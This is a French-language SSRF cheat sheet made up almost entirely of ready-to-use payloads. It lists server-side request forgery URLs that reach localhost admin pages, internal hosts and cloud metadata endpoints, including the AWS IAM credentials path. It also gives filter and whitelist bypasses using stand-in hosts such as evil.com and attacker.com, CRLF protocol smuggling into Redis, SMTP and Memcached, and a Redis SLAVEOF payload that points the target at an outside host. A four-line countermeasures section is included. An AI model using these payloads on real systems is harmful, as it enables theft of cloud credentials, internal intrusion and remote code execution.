# SSRF Cheat Sheet

## Rappels essentiels

- **SSRF** : la webapp fait une requête côté serveur vers une destination non prévue, contrôlée par l’attaquant.  
- Impacts : accès internes/admin, lecture métadonnées cloud, actions latérales, parfois RCE.  

## Détection rapide

- Paramètres suspects : `url=`, `path=`, `dest=`, `next=`, `image=`, `feed=`, `callback=`, `stockApi=`
- Tester loopback :
  - `http://127.0.0.1/`
  - `http://localhost/`
  - `http://127.1/`
- Blind SSRF (domaine attaquant) :
  - `http://<your-collab-domain>/`

## Exploitation – Cibles classiques

### 1) Serveur local
- `http://127.0.0.1/admin`
- `http://localhost/admin`

### 2) Réseau interne
- `http://192.168.0.68/admin`
- `http://10.0.0.5:8080/`

### 3) Métadonnées Cloud
- AWS :
  - `http://169.254.169.254/latest/meta-data/`
  - `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
- Azure :
  - `http://169.254.169.254/metadata/instance?api-version=2021-01-01`
- GCP :
  - `http://metadata.google.internal/computeMetadata/v1/`

## Bypass filtres

### Blacklist
- IP alternatives :
  - `127.1`
  - `2130706433`
  - `017700000001`
- Obfuscations :
  - `http://127.0.0.1%2fadmin`
  - `http://127.0.0.1%252fadmin`
  - `http://127.0.0.1:80#@evil.com`
  - `http://spoofed.burpcollaborator.net/`

### Whitelist
- Userinfo :
  - `https://allowed.com@evil.tld`
- Fragment :
  - `https://evil.tld#allowed.com`
- Sous-domaine :
  - `https://allowed.com.evil.tld/`
- Encodages :
  - `https://allowed.com%2f%2e%2e%2f127.0.0.1/`
  - `https://127.0.0.1%252fadmin`

### Protocoles
- `ftp://127.0.0.1/`
- `file:///etc/passwd`
- `gopher://127.0.0.1:6379/_SET%20key%20value`

## Bypass via Open Redirect

- Exemple :
  - `https://victime.tld/redirect?next=http://127.0.0.1/admin`
    
## Blind SSRF

- Détection :
  - `http://<your-collab-domain>/`
- Cloud exfil :
  - `http://169.254.169.254/latest/meta-data/`

## Vecteurs alternatifs

- XXE → SSRF :
  `<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/admin">`
- OAuth/OpenID : dynamic client registration vers IMDS.  
- Referer header :
  `Referer: http://attacker.com/malicious`

## Exemples prêts à l’emploi

- Localhost :
  - `http://127.0.0.1/admin`
  - `http://localhost/admin`
- Interne :
  - `http://192.168.0.68/admin`
  - `http://10.0.0.5:8080/`
- Bypass encodage :
  - `http://127.0.0.1%2fadmin`
  - `http://127.0.0.1%252fadmin`
- Whitelist contournée :
  - `https://allowed.com@127.0.0.1/admin`
  - `https://allowed.com.evil.tld/.%2e/127.0.0.1/`
- Open Redirect :
  - `https://victime.tld/redirect?next=http://127.0.0.1/admin`
- Cloud :
  - `http://169.254.169.254/latest/meta-data/`
  - `http://metadata.google.internal/computeMetadata/v1/`

## Découverte réseau via SSRF

- Selon différences de réponse/délai :
  - `http://10.0.0.5:22/`
  - `http://10.0.0.5:80/`
  - `http://10.0.0.5:443/`
    
## Contremesures
- Allow-list stricte + validation canonique.  
- Bloquer redirections et schémas non-HTTP.  
- Pas de relay brut des réponses internes.  
- Sécuriser IMDS (IMDSv2, hop limit).  

---

## Nouvelle ère de SSRF (Orange Tsai)

Ces payloads exploitent des **incohérences de parseurs d’URL**, du **protocol smuggling**, et des faiblesses spécifiques (cURL, PHP, NodeJS, Glibc…).  

### URL Parser Tricks

- `http://127.0.0.1:11211:80/`  
  (PHP `parse_url` → host=127.0.0.1 mais requester cURL → accès port 11211)  

- `http://google.com#@evil.com/`  
  (parseur considère host=google.com, mais requête envoyée à evil.com)  

- `http://foo@evil.com:80@google.com/`  
  (multi-`@` abuse → parseur et requester divergent)  

- `http://foo@127.0.0.1 @google.com/`  
  (bypass patch cURL en insérant un espace)  

### Protocol Smuggling (CRLF Injection)

- SMTP via HTTP :  
  `http://127.0.0.1:25/%0D%0AHELO orange.tw%0D%0AMAIL FROM:root@orange.tw%0D%0A`

- SMTP via HTTPS (TLS SNI trick) :  
  `https://127.0.0.1%0D%0AHELO orange.tw%0D%0AMAIL FROM:root@orange.tw:25/`

- Redis via HTTP :  
  `http://127.0.0.1:6379/%0D%0ASET key value%0D%0A`

- Memcached via HTTP :  
  `http://127.0.0.1:11211/%0D%0Aset foo 0 60 5%0D%0Adata%0D%0A`

### NodeJS Unicode Failures

- Utiliser Unicode pour contourner protections `../` :  
  - `http://orange.tw/sandbox/ＮＮ/passwd`  
  - `http://orange.tw/sandbox/\xFF\x2E\xFF\x2E/passwd`

- Smuggle commandes Redis malgré blocages :  
  - `http://127.0.0.1:6379/\r\nSLAVEOF orange.tw 6379\r\n`  
  - `http://127.0.0.1:6379/－＊SLAVEOF＠orange.tw＠6379－＊`  

### Glibc NSS Tricks

- Tab/CRLF dans hostnames → encore résolu en `127.0.0.1` :  
  - `http://127.0.0.1\tfoo.google.com`  
  - `http://127.0.0.1%09foo.google.com`  
  - `http://127.0.0.1%2509foo.google.com`

- Protocol smuggling via Host header injection :  
  - `http://127.0.0.1\r\nSLAVEOF orange.tw 6379\r\n:6379/`  
  - `https://127.0.0.1\r\nSET foo 0 60 5\r\n:443/`

### IDNA / Unicode Domain Abuse

- Domaines homoglyphes :  
  - `ⓖⓞⓞⓖⓛⓔ.com` (IDNA differences → google.com)  
  - `g\u200Doogle.com` (zero-width joiner → xn--google-pf0c.com)  
  - `wordpreß.com` (`ß` → `ss` selon normalisation)  

### Cas pratiques (WordPress / MyBB / GitHub Enterprise)

- TOCTOU DNS / double résolution :  
  - `http://foo.orange.tw/` → première résolution safe, seconde → 127.0.0.1  

- IDNA mismatch :  
  - `http://ß.orange.tw/` → `parse_url` échoue, mais cURL résout → 127.0.0.1  

- cURL host/port confusion :  
  - `http://127.0.0.1:11211#@google.com:80/`  
  - `http://foo@127.0.0.1:11211@google.com:80/`  

- Bypass via `http://0/` (interpreted as 127.0.0.1)  

## Résumé New Era Payloads

- **Parser confusion** : `http://google.com#@evil.com/`  
- **Multi-@ trick** : `http://foo@evil.com:80@google.com/`  
- **CRLF smuggling** : `http://127.0.0.1:25/%0D%0AHELO...`  
- **NodeJS Unicode** : `http://orange.tw/sandbox/ＮＮ/passwd`  
- **Glibc tabs** : `http://127.0.0.1%09foo.google.com`  
- **IDNA abuse** : `http://wordpreß.com`  
- **Special case** : `http://0/`  

---

